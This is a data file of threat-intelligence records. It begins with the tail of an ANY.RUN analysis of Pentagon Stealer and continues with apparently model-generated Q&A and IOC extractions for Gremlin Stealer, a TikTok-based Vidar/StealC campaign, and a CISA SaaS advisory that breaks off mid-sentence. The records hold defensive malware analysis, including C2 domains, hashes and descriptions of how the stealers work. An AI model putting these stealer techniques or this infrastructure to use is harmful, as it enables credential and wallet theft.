Stealer, which includeAcab StealerandVilsa Stealer.Golang Version of Pentagon StealerNow, it’s time to dissect the latest version of the stealer, which is currently being actively distributed. It kept the functionality of the Python version, but with some improvements described below.Image 21. Detect It Easy identified the sample as being written in GoView sandbox analysis of the Golang versionUnlike its Python counterpart, this variant does not download subsequent stages independently. Instead, it is used as one of the modules in the attack chain, as shown by sandbox analysis. Learn more about this in the ‘Infection Methods’ section.Upon launch, the stealer hides its console window and checks for the directory %LOCALAPPDATA%\\Realtek HD Audio Service on the victim’s computer, indicating previous execution.It then begins collecting information as described. The main improvement, unique to the Golang version, is the ability to steal data not only from Firefox but also from other Gecko-based browsers, including:ZenSeaMonkeyWaterfoxK-MeleonThunderbirdIceDragonCyberfoxBlackHawPale MoonMercuryLibrewolfThe malware now can steal passwords from these browsers, in addition to cookies. The rest of the functionality remains unchanged, though the programming language has been altered.C2 Communication ProtocolRegarding interaction with the C2 server, recent malware versions use two domains:stealer[.]cyandpentagon[.]cy. The communication method is identical in both the latest Python and Golang versions.Image 22. How Pentagon Stealer communicate with C2The stealer and command server communicate via HTTP requests. Upon log creation (create_log()), the victim sends the number of collected passwords, cookies, Discord tokens, and names of all collected files. The server responds with either a rejection or a log_uuid, which is subsequently used as the victim’s identifier, replacing the previously hardcoded uuid.Image 23. POST request to pentagon[.]cy/create_log shown in ANY.RUNImage 24.C2 responseInfection MethodsNotably, the Golang version of the stealer lacks any encryption of its code and strings, which is unusual since each subsequent stage of its Python counterpart is encrypted using AES. This suggests the possible existence of a dropper or loader.A search in TI Lookup involving the stealer yielded thefollowing analysis.Here is the sample’s execution chain:Image 25. Attack chain involving the Golang versionThe initial attack stage involved running an NSIS installer named BlumBot.exe. This installer executed a VBS script that displayed a familiar message, “vcruntime140.dll is missing from your computer”. It then proceeds to launch the next stage, Installer.exe.Notably, reverse-engineering BlumBot.exe was not necessary to uncover this. A tool capable of unpacking NSIS installers and extracting the .nsi script was enough. In our investigation, we usedNanaZip.NSIS installer in NanaZip:Image 26. NSIS installer in NanaZipFragment of the .nsi script:Image 27. Piece of .nsi scriptInstaller.exe is a loader written in Golang. Its sole purpose is to download and execute two files, ByPass.exe and Main.exe, from biteblob[.]com, and then send a Telegram message confirming successful execution.Following this, the stealer and a second module, which is actually a miner, are executed.This is just one example of how Pentagon Stealer is used. In Public Submissions, you can frequently observe samples of various malware using this stealer as one stage in an attack chain.Further Evolution of Pentagon StealerAs mentioned, this malware has appeared under various names, although its core functionality remains unchanged, with only minor logical modifications. This trend continues today.For instance, we recently discovered samples of a stealer with identical code but named BLX Stealer, as indicated by code strings and description inthis article.View sandbox analysis of BLX StealerThe attack consists of multiple stages, but we focus on the stealer itself.This version is written in Python, like its predecessors, but is packaged into an executable using PyInstaller. Withpyinstxtractorandpylingual.io, we successfully reconstructed the stealer’s source code for analysis.Regarding functionality, this version did not branch out from the latest Pentagon Stealer, as it lacks crypto-wallet injection and data theft from Gecko-based browsers other than Mozilla Firefox.Yet, it has unique features not previously observed:Extracts clipboard contentCaptures screenshotsReads system informationRetrieves additional Discord user information, including two-factor authentication status, Nitro subscription type, and user badgesSteals Steam and Epic Games account dataThe communication protocol with the C2 server is also noteworthy. The stealer does not send files directly; instead, it uploads them to gofile.io and then sends the access link to http[:]//<ip>/tgproxy/{USERID}/.Image 28. Example of C2 communicationWe also discovered a sample with the capability to steal NordVPN configuration files (user.config).ConclusionPentagon Stealer cannot be considered malware capable of complex targeted attacks due to its simplicity. Its development history shows that authors often merely changed the domain, leaving the functionality intact. However, a year has passed since its first mention, and it has undergone modifications, with the most significant changes occurring this year. The story is far from over, as new, more complex versions continue to emerge, albeit from different authors.IOCsName:build_59.exeMD5:a1726ff80b020aa291bdcbb21159c618SHA1:51c9978e60995174ed2b6b8cc5e8e1a973b66337SHA256:0411589551ab684892e3cc776674df0f07bcdbb931c29da93c2afd08fe077336DNS requestspentagon[.]cystealer[.]cyHTTP/HTTPS requestshttps://pentagon[.]cy/create_loghttps://pentagon[.]cy/log_datahttps://pentagon[.]cy/log_fileshttps://pentagon[.]cy/exodushttps://pentagon[.]cy/atomichttps://pentagon[.]cy/wallet_injectionMalware AnalysisMalwareThreat IntelligenceThreat HuntingThreat DetectionFollowWritten byANY.RUN47 followers·1 followingEmpowering businesses with proactive security solutions: Interactive Sandbox, TI Lookup and Feeds. Sign up for free:https://app.any.run#registerFollowNo responses yetHelpStatusAboutCareersPressBlogPrivacyRulesTermsText to speech"}}
{"metadata" : {"revision_id": "f656170-dirty", "ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://unit42.paloaltonetworks.com/new-malware-gremlin-stealer-for-sale-on-telegram/", "error": null, "summary": "", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "mitre_ttps": null, "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "Gremlin Stealer is an information-stealing malware written in C#.", "question": "What kind of malware is it?"}, {"answer": "The Gremlin Stealer involves an information-stealing malware attack, targeting sensitive data such as credit card details, browser cookies, crypto wallet information, and FTP and VPN credentials.", "question": "What kind of attack does it involve?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware using web inject?"}, {"answer": "Yes, Gremlin Stealer steals credentials from popular browsers, including cookies, passwords, and cards.", "question": "Is there credential theft from the browser?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "Yes, Gremlin Stealer steals credit card information, as well as other sensitive data such as browser cookies, crypto wallet information, and FTP and VPN credentials.", "question": "Does is steals credit cards or bank information?"}, {"answer": "Yes, Gremlin Stealer is related to a wallet stealer as it targets and steals data from various cryptocurrency wallets.", "question": "Is it related to wallet stealer?"}, {"answer": "The Gremlin Stealer malware steals various types of sensitive information, including browser cookies, passwords, credit card details, cryptocurrency wallet information, FTP and VPN credentials, and system information such as IP address, processor, and hardware ID.", "question": "What kind of information the malware steals?"}, {"answer": "Gremlin Stealer sends the stolen information to its server through the URL hxxp[:]//207.244.199[.]46/index.php, and also uploads the data to the server using a hard-coded Telegram API key.", "question": "Where does it forward the stolen information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://unit42.paloaltonetworks.com/new-malware-gremlin-stealer-for-sale-on-telegram/", "error": null, "summary": "Here is a concise 4-5 sentence summary of the article:\n\nThe Gremlin Stealer is a newly discovered information-stealing malware written in C# that has been actively advertised on a Telegram group since mid-March 2025. This malware uses various techniques to steal sensitive data, including bypassing Chrome's cookie V20 protection, targeting popular browsers, cryptocurrencies, FTP services, and VPN clients. The Gremlin Stealer's primary targets appear to be Windows users, with the malware exfiltrating data such as credit card details, browser cookies, and crypto wallet information to a configured server. The potential impact of this malware is significant, as it can lead to financial loss, identity theft, and compromised online accounts. Palo Alto Networks customers are protected from Gremlin Stealer through the company's Network Security solutions and Cortex line of products, including Cortex XDR and XSIAM.", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "hxxp[:]//207.244.199[.]46/index.php"}, {"type": "IP Address", "value": "207.244.199.46"}, {"type": "SHA256 Hash", "value": "d1ea7576611623c6a4ad1990ffed562e8981a3aa209717065eddc5be37a76132"}], "mitre_ttps": null, "keywords_found": ["apt", "phishing", "browser", "passwords", "cybercrime", "analysis", "intelligence", "cryptocurrency", "malicious", "fraud", "threat", "wallet"], "article_textual_content": "# Gremlin Stealer: New Stealer on Sale in Underground Forum\n\n- By:\n    - Pranay Kumar Chhaparwal\n    - Benjamin Chang\n- Published:April 29, 2025\n- Categories:\n    - Cybercrime\n    - Malware\n    - Threat Research\n- Tags:\n    - Cryptocurrency\n    - FTP\n    - Google Chrome\n    - Infostealer\n    - Telegram\n\n## Executive Summary\n\nUnit 42 researchers have identified information-stealing malware written in C#, called Gremlin Stealer. This malware appears to be a variant of Sharp Stealer, displaying a code base strikingly similar to Hannibal Stealer. This stealer’s seller has actively advertised it on a Telegram group since mid-March 2025.\n\nThis information-stealing malware exfiltrates data from its victims and uploads this information to its web server for publication. It can capture data from browsers, the clipboard and the local disk to steal sensitive data such as credit card details, browser cookies, crypto wallet information, File Transfer Protocol (FTP) and virtual private network (VPN) credentials.\n\nPalo Alto Networks customers are better protected from Gremlin Stealer through our Network Security solutions and Cortex line of products, including Cortex XDR and XSIAM, Advanced WildFire, Advanced Threat Prevention, Advanced URL Filtering and Advanced DNS Security.\n\nIf you think you might have been compromised or have an urgent matter, contact the Unit 42 Incident Response team.\n\n## Malware Advertisement\n\nGremlin Stealer’s authors predominantly distribute it through a Telegram channel named CoderSharp. Gremlin Stealer has a code layout comparable to Hannibal Stealer, which is reportedly a variant of Sharp Stealer. This malware is undergoing active development.\n\n### Sales and Feature Advertisement on Telegram\n\nThe description of Gremlin Stealer asserts that the malware can steal data from a wide range of software. Figure 1 shows a Telegram post advertising Gremlin Stealer.\n\nFigure 1. Telegram post advertising Gremlin Stealer.\n\n### Published Stolen Data\n\nThe group behind Gremlin Stealer claims to have uploaded vast amounts of data from its victims' machines to its server at 207.244.199[.]46. We assess this server is a configurable portal that comes with the sale of the malware.\n\nFigure 2 shows a screenshot of Gremlin Stealer’s website login page.\n\nFigure 2. Gremlin Stealer login page.\n\nThe Gremlin Stealer website currently displays 14 files. The authors of the website describe these files as ZIP archives of stolen data from victims' machines, with options to delete or download the archives.\n\nAs indicated by the timestamps in Figure 3, Gremlin Stealer has been active since March 2025.\n\nFigure 3. Gremlin Stealer site showing entries for stolen victim data.\n\nThe web interface shown in Figure 3 also demonstrates the user interface of the backend infrastructure that comes with the purchase of this malware.\n\n## Technical Analysis\n\nWe have monitored Gremlin Stealer since we initially discovered it in March 2025. The functions of this stealer from Figure 1 are listed below.\n\nStealer functions\n\n- Basic features include:\n    - Bypassing Chrome cookie V20 protection\n    - Its build process does not download anything from the internet\n- Stealing functionality targets the following:\n    - Popular browsers (e.g., cookies, passwords, cards, forms)\n    - Popular cryptocurrencies\n    - Clipboard data\n    - FTP services\n    - Steam (token and session data)\n    - Popular VPN services\n    - Telegram session data\n    - Discord tokens (spot search by browsers)\n    - Screenshots\n    - Specified information from victim PC (e.g., BSID, HVID, RAM, CPU, GPU and IP address)\n\n### Bypass Chrome Cookie V20 Protection\n\nThe first feature advertised for Gremlin Stealer is that it bypasses Chrome’s cookie v20 protection. Figure 4 shows code snippets from a Gremlin Stealer sample viewed in dnSpy.\n\nFigure 4. GetCookies function from a Gremlin Stealer sample shown in dnSpy.\n\nThis view shows the GetCookies function under a V20Collect class, which demonstrates how it bypasses Chrome's cookie V20 protection and obtains cookie-related information. This is a common technique that has been used by many information stealers. Google made changes to prevent the use of this technique, as detailed in the post, “Changes to remote debugging switches to improve security.”\n\nBelow, Figure 5 shows the writteCookieToFile function that writes stolen information into a text file under the LOCAL\\_APP\\_DATA folder for uploading to Gremlin's server. The text file contains the associated domain, name, value, path and expiration date for each of the cookies.\n\nFigure 5. GetCookies function from a Gremlin Stealer sample in dnSpy.\n\n### Support for Chromium and Gecko Browsers\n\nGremlin Stealer checks for cookies and saved passwords from an extensive list of Chromium- and Gecko-based browsers and writes them into a file to be exfiltrated later.\n\nBelow, Figure 6 shows a code snippet from the ChromiumBrowsers function with a list of Chromium-based browsers it steals from. A RunBrowserv20 function is also called to handle newer cookie encryption called \"v20\" in Chromium-based browsers. There is also an equivalent function built to handle a list of Gecko-based browsers.\n\nFigure 6. ChromiumBrowsers function.\n\n### Cryptocurrency Wallet Stealer\n\nFigure 7 shows that Gremlin Stealer checks for various cryptocurrency wallets and steals files from each directory.\n\nFigure 7. List of cryptocurrency wallets targeted by Gremlin Stealer.\n\nTaking Litecoin as an example, Gremlin Stealer checks for a related registry entry. If found, it copies the wallet.dat file to a temporary directory, as illustrated in Figure 8 below.\n\nFigure 8. Gremlin Stealer's Litecoin wallet stealing function.\n\nAs Figure 9 shows, Gremlin Stealer searches for files containing a list of domains associated with each cryptocurrency in specific folders and then duplicates these files for later exfiltration. It also creates a hash list representing the data to be exported.\n\nFigure 9. Cryptocurrency-related domains that Gremlin Stealer searches for.\n\n### FTP Credentials\n\nGremlin Stealer attempts to steal FTP usernames and passwords. Figure 10 shows a decompiled code snippet for the TotalCommander FTP credential-stealing function.\n\nFigure 10. Gremlin Stealer code snippet for copying TotalCommander files.\n\n### VPN Credentials\n\nGremlin Stealer also obtains username, password and configuration files from popular VPN clients. Figure 11 shows a code snippet of the VPN stealing function.\n\nFigure 11. Gremlin Stealer code snippet for stealing VPN data.\n\n### Telegram and Discord Sessions\n\nGremlin Stealer also targets data and session information from Telegram and Discord to upload to its configured server.\n\nFigures 12 and 13 show code snippets for stealing information from Telegram and Discord.\n\nFigure 12. Gremlin Stealer code snippet for Telegram data stealing function.\n\nFigure 13. Gremlin Stealer code snippet for Discord sessions stealing function.\n\n### System Information\n\nGremlin Stealer creates a text file that contains system information (e.g., PC username, clipboard data, processor information and hardware ID), as shown below in Figure 14.\n\nFigure 14. Gremlin Stealer code snippet for system information stealing function.\n\n### Credit Card Information Stealing\n\nThis malware also steals credit card information and sends the data to its server. Figure 15 shows a code snippet of Gremlin Stealer's function to steal credit card information.\n\nFigure 15. Gremlin Stealer code snippet for the function to steal credit card information.\n\n### Uploading the Victim’s Files to Gremlin Stealer's Server\n\nFigure 16 shows that Gremlin Stealer creates a folder under LOCAL\\_APP\\_DATA to store the following in plain text files:\n\n- Saved passwords\n- Cookies\n- Autofill data\n- Screenshots\n- System information\n- Discord sessions\n- Telegram sessions\n- FTP and VPN credentials\n- Cryptocurrency wallets data\n\nFigure 16. Gremlin Stealer sends all stolen data to a private server.\n\nThese texts are gathered into a ZIP archive, which is sent to its server through the URL hxxp[:]//207.244.199[.]46/index.php, shown in Figure 17.\n\nFigure 17. Code snippet with URL for Gremlin Stealer server.\n\nGremlin Stealer sends this data using the Telegram bot shown in Figure 18. It uploads the stolen data to the server using a hard-coded Telegram API key.\n\nFigure 18. Gremlin Stealer code snippet with URL for Telegram bot.\n\nFigure 19 shows a TCP stream of an HTTP POST request that Gremlin Stealer makes when sending stolen information to its server. It sends the information as a ZIP archive that contains all the data stolen from the victim's Windows host.\n\nFigure 19. TCP stream of an HTTP POST request for a ZIP archive being uploaded to the Gremlin Stealer server.\n\n## Conclusion\n\nGremlin Stealer is new malware that has been active since March 2025. This malware searches for a variety of applications on a victim's Windows computer, and our code analysis confirms the specific applications targeted.\n\nStealers of this type are well-known entities in the threat landscape, and there are many approaches to protecting customers from these evolving attacks. Palo Alto Networks diligently monitors these campaigns, utilizing a range of static and dynamic techniques to detect and prevent them.\n\nThese methods include dynamic and behavioral detections, as well as more reactive signature or pattern-based solutions.\n\n### Palo Alto Networks Protection and Mitigation\n\nPalo Alto Networks customers are better protected from the threats discussed above through the following products:\n\n- The Advanced WildFire machine-learning models and analysis techniques have been reviewed and updated in light of the IoCs shared in this research.\n- Advanced URL Filtering and Advanced DNS Security identify known domains and URLs associated with this activity as malicious.\n- Advanced Threat Prevention has an inbuilt machine learning-based detection that can detect exploits in real time.\n- Cortex XDR and XSIAM are designed to:\n    - Prevent the execution of known malicious malware, and also prevent the execution of unknown malware using Behavioral Threat Protection and machine learning based on the Local Analysis module.\n    - Protect against credential gathering tools and techniques using the new Credential Gathering Protection available from Cortex XDR 3.4.\n    - Detect post-exploit activity, including credential-based attacks, with behavioral analytics, through Cortex XDR Pro.\n\nIf you think you may have been compromised or have an urgent matter, get in touch with the Unit 42 Incident Response team or call:\n\n- North America: Toll Free: +1 (866) 486-4842 (866.4.UNIT42)\n- UK: +44.20.3743.3660\n- Europe and Middle East: +31.20.299.3130\n- Asia: +65.6983.8730\n- Japan: +81.50.1790.0200\n- Australia: +61.2.4062.7950\n- India: 00080005045107\n\nPalo Alto Networks has shared these findings with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about the Cyber Threat Alliance.\n\n## Indicators of Compromise\n\nSHA256 hash of the Gremlin Stealer sample analyzed for this article:\n\n- d1ea7576611623c6a4ad1990ffed562e8981a3aa209717065eddc5be37a76132\n\nURLs:\n\n- hxxp[:]//207.244.199[.]46/index.php\n\nUpdated May 9, 2025, at 10:05 a.m. PT to note Gremlin Stealer's similarities to other stealers.\n\n### Tags\n\n- Cryptocurrency\n- FTP\n- Google Chrome\n- Infostealer\n- Telegram\n\n### Table of Contents\n\n### Related Articles\n\n- DarkCloud Stealer: Comprehensive Analysis of a New Attack Chain That Employs AutoIt\n- Slow Pisces Targets Developers With Coding Challenges and Introduces New Customized Python Malware\n- Investigating Scam Crypto Investment Platforms Using Pyramid Schemes to Defraud Victims\n\n## Related  Resources\n\n#### Threat Group Assessment: Muddled Libra (Updated May 16, 2025)\n\n- 0ktapus\n- Muddled Libra\n- Social engineering\n\n#### DarkCloud Stealer: Comprehensive Analysis of a New Attack Chain That Employs AutoIt\n\n- AutoIT\n- Infostealer\n\n#### Stealthy .NET Malware: Hiding Malicious Payloads as Bitmap Resources\n\n- .NET\n- Agent Tesla\n- Microsoft Windows\n\n#### Iranian Cyber Actors Impersonate Model Agency in Suspected Espionage Operation\n\n- Iran\n- Social engineering\n- Phishing\n\n#### Lampion Is Back With ClickFix Lures\n\n- PowerShell\n- VBScript\n\n#### AI Agents Are Here. So Are the Threats.\n\n- Prompt injection\n\n#### Extortion and Ransomware Trends January-March 2025\n\n- BianLian\n- Akira ransomware\n- Muddled Libra\n\n#### False Face: Unit 42 Demonstrates the Alarming Ease of Synthetic Identity Creation\n\n- DPRK\n- Social engineering\n- Wagemole\n\n#### Cascading Shadows: An Attack Chain Approach to Avoid Detection and Complicate Analysis\n\n- XLoader\n- RemcosRAT\n\n## Peace of mind comes from staying ahead of threats. Subscribe today.\n\nSubscribe for email updates to all Unit 42 threat research.\nBy submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.\n\nInvalid captcha!\n\n## Get the latest news, invites to events, and threat alerts\n\nBy submitting this form, you agree to our\n                                    Terms of Use\n                                    and acknowledge our\n                                    Privacy Statement.\n\n## Products and Services\n\n- AI-Powered Network Security Platform\n- Secure AI by Design\n- Prisma AIRS\n- AI Access Security\n- Cloud Delivered Security Services\n- Advanced Threat Prevention\n- Advanced URL Filtering\n- Advanced WildFire\n- Advanced DNS Security\n- Enterprise Data Loss Prevention\n- Enterprise IoT Security\n- Medical IoT Security\n- Industrial OT Security\n- SaaS Security\n\n- Next-Generation Firewalls\n- Hardware Firewalls\n- Software Firewalls\n- Strata Cloud Manager\n- SD-WAN for NGFW\n- PAN-OS\n- Panorama\n- Secure Access Service Edge\n- Prisma SASE\n- Application Acceleration\n- Autonomous Digital Experience Management\n- Enterprise DLP\n- Prisma Access\n- Prisma Access Browser\n- Prisma SD-WAN\n- Remote Browser Isolation\n- SaaS Security\n\n- AI-Driven Security Operations Platform\n- Cloud Security\n- Cortex Cloud\n- Application Security\n- Cloud Posture Security\n- Cloud Runtime Security\n- Prisma Cloud\n- AI-Driven SOC\n- Cortex XSIAM\n- Cortex XDR\n- Cortex XSOAR\n- Cortex Xpanse\n- Unit 42 Managed Detection &amp; Response\n- Managed XSIAM\n\n- Threat Intel and Incident Response Services\n- Proactive Assessments\n- Incident Response\n- Transform Your Security Strategy\n- Discover Threat Intelligence\n\n## Company\n\n- About Us\n- Careers\n- Contact Us\n- Corporate Responsibility\n- Customers\n- Investor Relations\n- Location\n- Newsroom\n\n## Popular Links\n\n- Blog\n- Communities\n- Content Library\n- Cyberpedia\n- Event Center\n- Manage Email Preferences\n- Products A-Z\n- Product Certifications\n- Report a Vulnerability\n- Sitemap\n- Tech Docs\n- Unit 42\n- Do Not Sell or Share My Personal Information\n\n- Privacy\n- Trust Center\n- Terms of Use\n- Documents\n\nCopyright © 2025 Palo Alto Networks. All Rights Reserved\n\n- EN Select your language\n\n### Default Heading"}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://www.infosecurity-magazine.com/news/ai-tiktok-videos-infostealer/", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "The malware used in this campaign is information-stealing malware, specifically Vidar and StealC.", "question": "What kind of malware is it?"}, {"answer": "It involves a social engineering attack, where AI-generated TikTok videos instruct users to execute PowerShell commands that initiate a malware infection chain, leading to the installation of information-stealing malware such as Vidar and StealC.", "question": "What kind of attack does it involve?"}, {"answer": "No, unlike previous campaigns, this attack does not depend on malicious websites and JavaScript injections.", "question": "Does the malware using web inject?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Is there credential theft from the browser?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The malware, specifically Vidar and StealC, is designed to steal information, but the context does not explicitly mention credit cards or bank information.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The malware campaign is related to information-stealing malware, such as Vidar and StealC, which can potentially steal sensitive information, but it is not specifically mentioned as a wallet stealer.", "question": "Is it related to wallet stealer?"}, {"answer": "The malware, specifically Vidar and StealC, steals information, but the context does not provide specific details on the type of information stolen.", "question": "What kind of information the malware steals?"}, {"answer": "The stolen information is forwarded to the command-and-control (C2) infrastructure, which is embedded in services like Steam and Telegram, masking its IP data.", "question": "Where does it forward the stolen information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://www.infosecurity-magazine.com/news/ai-tiktok-videos-infostealer/", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "allaivo[.]me"}, {"type": "Domain or URL", "value": "amssh[.]co"}], "keywords_found": ["threat", "fraud", "apt", "cybercrime", "malicious", "bank", "browser", "backdoor"], "article_textual_content": "# AI-Generated TikTok Videos Used to Distribute Infostealer Malware\n\nA new malware campaign has been observed using TikTok’s viral nature and vast user base to spread information-stealing malware such as Vidar and StealC.\n\nAccording to a new advisory by Trend Micro, this latest social engineering effort marks a shift from traditional malicious tactics, exploiting the platform’s reach and user trust to spread harmful software via seemingly innocuous video content.\n\n## TikTok Videos Deliver Malware via PowerShell\n\nUnlike previous campaigns that depended on malicious websites and JavaScript injections, this attack operates entirely within TikTok.\n\nThe campaign features short-form videos, likely created with AI tools, that instruct users to execute PowerShell commands. These commands, presented as methods to activate popular software like Microsoft Office or Spotify, initiate a malware infection chain.\n\nWhat sets this tactic apart is its use of verbal and visual guidance in the videos. The commands are never embedded in text or links, making them harder for traditional security systems to detect. Viewers are coaxed into typing the commands themselves, making them unwitting participants in the malware installation.\n\nTrend researchers traced the campaign to accounts including @gitallowed, @zane.houghton and @digitaldreams771.\n\nThese accounts, now inactive, published similar AI-voiced videos with minor variations in camera angles and payload URLs, suggesting automation was used in their creation.\n\nRead more on social media-driven malware threats: Half of Consumers Targeted by Social Media Fraud Ads\n\nOne video in particular gained nearly 500,000 views and over 20,000 likes. Its popularity indicates significant user interaction, increasing the risk that many followed the instructions and infected their systems.\n\nThe malware chain begins by using PowerShell to download a script from allaivo[.]me, which then fetches and installs Vidar or StealC.\n\nThe malicious PowerShell script:\n\n- Hides files in user directories and adds them to Windows Defender’s exclusion list\n- Downloads malware from amssh[.]co\n- Uses retry logic to ensure execution\n- Sets up system persistence\n- Cleans up forensic evidence to avoid detection\n\nVidar further masks its command-and-control (C2) infrastructure by embedding IP data in services like Steam and Telegram.\n\n## A Call for Smarter Defenses\n\nAccording to Trend Micro, the campaign highlights the urgent need for updated defense strategies that go beyond traditional threat detection.\n\nOrganizations should actively monitor social media platforms for high-engagement posts that contain technical instructions, as these may be linked to malicious activity.\n\nImplementing behavioral detection tools is also essential to flag unusual user actions, such as unexpected command-line executions.\n\nAdditionally, user education must evolve to include guidance on recognizing and reporting deceptive video content, especially those that exploit social engineering tactics through visual and auditory cues.\n\nImage credit: BongkarnGraphic / Shutterstock.com\n\n## You may also like\n\n1. Researchers Uncover New Information Stealer 'Stealc'News21 Feb 2023\n2. Sophisticated Cyber-Espionage Group Earth Estries ExposedNews1 Sep 2023\n3. Rhadamanthys Malware Deployed By TA547 Against German TargetsNews10 Apr 2024\n4. Mekotio Trojan Targets Latin American Banking CredentialsNews8 Jul 2024\n5. Void Rabisu's RomCom Backdoor Reveals Shifting Threat Actor GoalsNews1 Jun 2023\n\n## What’s hot on Infosecurity Magazine?\n\n- Read\n- Shared\n- Watched\n- Editor's Choice\n\n### Flaw in Google Cloud Functions Sparks Broader Security Concerns\n\n1\n\n### NCSC Helps Firms Securely Dispose of Old IT Assets\n\n2\n\n### Cybercriminals Mimic Kling AI to Distribute Infostealer Malware\n\n3\n\n### Critical Zero-Days Found in Versa Networks SD-WAN/SASE Platform\n\n4\n\n### Uncensored AI Tool Raises Cybersecurity Alarms\n\n5\n\n### Russian APT Groups Intensify Attacks in Europe with Zero-Day Exploits and Wipers\n\n6\n\n### CISA Reverses Decision on Cybersecurity Advisory Changes\n\n1\n\n### UN Launches New Cyber-Attack Assessment Framework\n\n2\n\n### Russian APT Groups Intensify Attacks in Europe with Zero-Day Exploits and Wipers\n\n3\n\n### New Malware on PyPI Poses Threat to Open-Source Developers\n\n4\n\n### Uncensored AI Tool Raises Cybersecurity Alarms\n\n5\n\n### Coinbase Offers $20m Bounty to Take Down Cybercrime Ring Behind Hack\n\n6\n\n### Cybersecurity Employment: Making Sense of Conflicting Messaging\n\n1\n\n### Closing the Browser Security Gap: Defending Against Modern Web-Based Threats\n\n2\n\n### How to Tackle Rising Cloud Identity Attacks\n\n3\n\n### Safeguarding Critical Supply Chain Data Through Effective Risk Assessment\n\n4\n\n### How to Implement Attack Surface Management in the AI and Cloud Age\n\n5\n\n### Reimagining Digital Identity in the Age of AI: Challenges and Innovations\n\n6\n\n### Bayer CISO Kevin Jones Securing Innovative Practices in the Life Science Industry\n\n1\n\n### Verizon DBIR: Small Businesses Bearing the Brunt of Ransomware Attacks\n\n2\n\n### Zero Trust’s Reality Check: Addressing Implementation Challenges\n\n3\n\n### How the Channel is Evolving in the Cybersecurity Sector\n\n4\n\n### FBI Reveals “Staggering” $16.6bn Lost to Cybercrime in 2024\n\n5\n\n### How CISO's Can Survive and Thrive in a Complex Cyber Landscape\n\n6\n\n## The magazine\n\n- About Infosecurity\n- Meet the team\n- Contact us\n\n## Advertisers\n\n- Media pack\n\n## Contributors\n\n- Forward features\n- Op-ed\n- Next-gen submission\n\n- Copyright © 2025 Reed Exhibitions Ltd.\n- Terms and Conditions\n- Privacy Policy\n- Intellectual property statement\n- Cookie Settings\n- Cookie Policy\n- Sitemap"}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://thehackernews.com/2025/05/cisa-warns-of-suspected-broader-saas.html", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "The answer cannot be determined from the provided context.", "question": "What kind of malware is it?"}, {"answer": "The attack involves exploiting app secrets and cloud misconfigurations, with threat actors accessing client secrets for Commvault's Microsoft 365 backup software-as-a-service (SaaS) solution. It also includes a zero-day vulnerability (CVE-2025-3928) that enables a remote, authenticated attacker to create and execute web shells.", "question": "What kind of attack does it involve?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware using web inject?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Is there credential theft from the browser?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Is it related to wallet stealer?"}, {"answer": "The malware steals client secrets for Commvault's Microsoft 365 backup software-as-a-service solution, and may have accessed a subset of app credentials that certain Commvault customers use to authenticate their M365 environments.", "question": "What kind of information the malware steals?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Where does it forward the stolen information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://thehackernews.com/2025/05/cisa-warns-of-suspected-broader-saas.html", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": ["analysis", "threat", "apt", "malicious", "botnet", "dropper"], "article_textual_content": "# CISA Warns of Suspected Broader SaaS Attacks Exploiting App Secrets and Cloud Misconfigs\n\nThe U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Thursday revealed that Commvault is monitoring cyber threat activity targeting applications hosted in their Microsoft Azure cloud environment.\n\n\"Threat actors may have accessed client secrets for Commvault's (Metallic) Microsoft 365 (M365) backup software-as-a-service (SaaS) solution, hosted in Azure,\" the agency said.\n\n\"This provided the threat actors with unauthorized access to Commvault's customers' M365 environments that have application secrets stored by Commvault.\"\n\nCISA further noted that the activity may be part of a broader campaign targeting various software-as-a-service (SaaS) providers' cloud infrastructures with default configurations and elevated permissions.\n\nThe advisory comes weeks after Commvault revealed that Microsoft notified the company in February 2025 of unauthorized activity by a nation-state threat actor within its Azure environment.\n\nThe incident led to the discovery that the threat actors had been exploiting a zero-day vulnerability 